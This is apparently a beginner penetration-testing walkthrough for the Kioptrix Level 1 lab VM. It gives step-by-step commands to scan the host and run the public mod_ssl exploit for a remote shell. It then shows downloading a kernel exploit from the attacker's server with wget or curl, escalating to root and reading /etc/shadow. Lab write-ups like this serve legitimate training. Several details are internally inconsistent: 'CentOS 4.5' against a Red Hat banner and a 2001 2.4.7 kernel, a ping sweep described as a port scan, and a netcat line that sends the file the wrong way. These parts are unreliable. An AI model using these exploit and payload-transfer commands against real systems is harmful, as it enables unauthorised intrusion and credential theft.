# Kioptrix Level 1 (#1): OSCP Walkthrough

**Machine:** Kioptrix Level 1 (#1)  
**Download:** [VulnHub: Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)  
**Difficulty:** Beginner  
**OS:** CentOS 4.5 (Linux 2.4.x kernel)  
**Goal:** Obtain `root` access and retrieve the flag  

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Service Enumeration](#2-service-enumeration)
3. [Exploitation: mod_ssl / OpenSSL (CVE-2002-0082)](#3-exploitation--mod_ssl--openssl)
4. [Privilege Escalation: Kernel Exploit](#4-privilege-escalation)
5. [Key Takeaways](#5-key-takeaways)
6. [Screenshots](#6-screenshots)

---

## 1. Reconnaissance & Scanning

### Network Discovery

Identify the target IP on the local network:

```bash
# Netdiscover to find live hosts
sudo netdiscover -r 192.168.1.0/24

# OR
sudo arp-scan --localnet
```

### Initial Nmap Scan

```bash
# Quick port scan to find open ports
nmap -sn 192.168.1.0/24
```

```bash
# Full TCP port scan (all ports take time: start with top 1000)
nmap -sS -sV -sC -p- --min-rate=1000 -T4 -oN nmap_initial.txt <TARGET_IP>
```

### Nmap Results

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 3.5p1 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 (Unix)  (Red-Hat/Linux)
443/tcp  open  ssl/https   Apache httpd 1.3.20 (Unix)  (Red-Hat/Linux)
MAC Address: 00:0C:29:XX:XX:XX (VMware)
```

**Key Findings:**
- **Apache 1.3.20**: ancient, full of vulnerabilities
- **OpenSSH 3.5p1**: old version but not immediately exploitable
- **CentOS 4.5** (confirmed by `banner` and later shell access)
- **SSL on port 443**: mod_ssl/OpenSSL likely present

---

## 2. Service Enumeration

### HTTP Service: Port 80

```bash
# Check HTTP headers
curl -I http://<TARGET_IP>

# Browse to web page
firefox http://<TARGET_IP>
# or
curl http://<TARGET_IP> | head -50
```

The web page is a basic Apache test page with no obvious functionality.

### SSL / HTTPS Enumeration: Port 443

```bash
# Check SSL certificate details
openssl s_client -connect <TARGET_IP>:443 -showcerts

# Check for mod_ssl
nmap --script ssl-enum-ciphers -p 443 <TARGET_IP>

# Identify exact mod_ssl version
nmap -sV --script ssl-enum-ciphers -p 443 <TARGET_IP>
```

**Key Finding:** The server runs **mod_ssl 2.8.4** on **Apache 1.3.20** with **OpenSSL 0.9.6b**. This is vulnerable to the **OpenSSL "Slapper" worm exploit (CVE-2002-0082)**.

### SSH Enumeration: Port 22

```bash
# SSH banner grabbing
ssh <TARGET_IP>
nc -nv <TARGET_IP> 22
```

Services summary:

| Port | Service | Version | Vulnerability |
|------|---------|---------|--------------|
| 22 | SSH | OpenSSH 3.5p1 | Protocol 1.99 (weak) |
| 80 | HTTP | Apache 1.3.20 | Multiple outdated vulns |
| 443 | HTTPS | Apache 1.3.20 + mod_ssl 2.8.4 | **OpenSSL remote buffer overflow (CVE-2002-0082)** |

---

## 3. Exploitation: mod_ssl / OpenSSL

### Step 1: Search for the Exploit

```bash
# Search for mod_ssl exploits
searchsploit mod_ssl

# Search for OpenSSL exploits
searchsploit openssl

# Locate the classic exploit
searchsploit -m 764.c
```

### Step 2: Compile the Exploit

The exploit target code (764.c) includes target IDs for different OpenSSL versions. For CentOS 4.5 with OpenSSL 0.9.6b, we need the correct target.

```bash
# View the exploit to understand targets
cat 764.c | grep -i "target" | head -20

# Compile on Kali
gcc -o ssl_exploit 764.c -lcrypto
```

If you get an SSL-related compilation error, install the dev library:

```bash
sudo apt-get install libssl-dev
gcc -o ssl_exploit 764.c -lcrypto -lssl
```

### Step 3: Find and Test Targets

```bash
# List available targets from within the exploit
./ssl_exploit --help

# Common target IDs for OpenSSL 0.9.6b / Red Hat / CentOS 4.x:
# 0x08 = Red Hat Linux 7.0 (Omega)
# 0x09 = Red Hat Linux 7.0 (another variant)
# 0x6b = try this for older systems

# Test a target
./ssl_exploit <TARGET_IP> 443 0x6b
```

### Step 4: Execute the Exploit

```bash
# Run the exploit with target ID
./ssl_exploit <TARGET_IP> 443 0x08

# If no shell returns, try different target IDs
./ssl_exploit <TARGET_IP> 443 0x09
./ssl_exploit <TARGET_IP> 443 0x6b
```

**Successful execution** will spawn a remote shell running as `apache` user.

### Alternative Exploit: WebDAV / PUT Upload

```bash
# Check if WebDAV is enabled
davtest -url http://<TARGET_IP>

# If WebDAV is enabled, try PUT upload
cadaver http://<TARGET_IP>
> put shell.php
```

### Upgrade to a Better Shell

```bash
# From the remote shell, spawn a pseudo-terminal
python -c 'import pty; pty.spawn("/bin/bash")'

# Or
/bin/bash -i
```

---

## 4. Privilege Escalation

### Step 1: Gather System Information

```bash
# Confirm current user
whoami
id

# Check kernel version
uname -a

# Check distribution version
cat /etc/redhat-release

# Check available compilers
which gcc cc g++

# Check sudo privileges
sudo -l
```

**Output:**
```
Linux kioptrix 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
CentOS 4.5
```

### Step 2: Search for Kernel Exploits

Search for kernel-level privilege escalation:

```bash
# On attacker machine
searchsploit "linux kernel 2.4" centos

# Specific to CentOS 4.5 / 2.4.7 kernel
searchsploit linux/2.4.7

# The classic exploit for this machine is typically
# Linux Kernel 2.4.x - 'ptrace/kmod' Local Privilege Escalation (2)
searchsploit -m 3
```

### Step 3: Transfer Exploit to Target

**On Kali machine: host the exploit:**

```bash
# Copy exploit to web server directory
cp /usr/share/exploitdb/exploits/linux/local/3.c .

# Start Python HTTP server
python3 -m http.server 8000
```

**On the target (Kioptrix): download the exploit:**

```bash
cd /tmp
wget http://<KALI_IP>:8000/3.c
# OR
curl -O http://<KALI_IP>:8000/3.c
# OR via nc
nc <KALI_IP> 8000 < 3.c
```

### Step 4: Compile and Execute the Local Exploit

```bash
# Compile on target
cd /tmp
gcc -o exploit 3.c

# If gcc is not available, try compiling statically on Kali
# gcc -static -o exploit 3.c
# curl -O http://<KALI_IP>:8000/exploit

# Run the exploit
./exploit
```

### Step 5: Verify Root Access

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Read the flag or sensitive files
cat /etc/shadow | head -5
ls /root/
cat /root/flag
```

---

## 5. Key Takeaways

1. **Always enumerate service versions thoroughly**: old software versions (Apache 1.3.20, OpenSSL 0.9.6b) are a goldmine for exploitation.
2. **mod_ssl + OpenSSL**: The classic OpenSSL "Slapper" exploit (circa 2002) demonstrates that even SSL services can introduce remote code execution vectors.
3. **Kernel version matters**: After gaining initial access, the kernel version (2.4.7) dictated which privesc exploit would work.
4. **Compiling on target vs. attacker**: Always check if `gcc` is available on the target; if not, compile a static binary on Kali.
5. **Target IDs matter**: The remote exploit required the correct target ID matching the exact OpenSSL build. Trial and error may be necessary.
6. **Multiple ways in**: Even if one exploit path fails, alternatives like WebDAV PUT upload may work on this machine.

---

## 6. Screenshots

*No screenshots available for this machine.*

---

## Quick Reference: Commands

| Phase | Command |
|-------|---------|
| Discovery | `sudo netdiscover -r 192.168.1.0/24` |
| Nmap Scan | `nmap -sS -sV -sC -p- -T4 -oN scan.txt <TARGET_IP>` |
| Mod_SSL Search | `searchsploit mod_ssl` |
| Compile | `gcc -o ssl_exploit 764.c -lcrypto` |
| Run Exploit | `./ssl_exploit <TARGET> 443 0x6b` |
| Upgrade Shell | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| Start HTTP Server | `python3 -m http.server 8000` |
| Download on Target | `wget http://<KALI_IP>:8000/file` |
| Kernel Exploit | `searchsploit -m 3 && gcc -o exploit 3.c && ./exploit` |

---

*M4d3 w1th ❤️ by Ankit Patidar*
